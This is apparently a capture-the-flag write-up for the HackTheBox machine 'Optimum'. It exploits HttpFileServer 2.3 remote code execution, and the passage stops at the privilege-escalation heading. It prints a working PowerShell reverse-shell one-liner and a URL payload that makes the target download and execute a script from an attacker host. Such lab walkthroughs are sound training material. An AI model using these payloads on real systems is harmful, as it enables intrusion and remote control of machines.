# Optimum - Windows, easy (10.10.10.8)

### Enumeration
```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

In the website the most interesting things are a Login button and some server informations:
```
HttpFileServer 2.3
Server time: 26/8/2022 1:55:10 πμ
Server uptime: 00:04:24
```

Searching with `searchsploit HttpFileServer 2.3`, we can find a script that essentially performs an HTTP request for `/?search={.+exec|[url-encoded command].}`, and allows us to perform RCE.

### Obtaining Kostas
To get a shell, we can create a powershell script and write in it the following data:
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

which is an reverse shell in PowerShell taken from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1).

To exploit the vulnerability and make it execute our reverse shell we need to setup an http server with python and a netcat listener.

Then, visit: `http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.2/rev.ps1').}` to make the target download our rev.ps1 file (the reverse shell in PowerShell).
When the file is downloaded, it is also executed by IEX (Invoke-Expression: runs command or expression on the local computer), and then shell connects back to our listening nc.

At this point we can get the first flag!

### From Kostas to Root
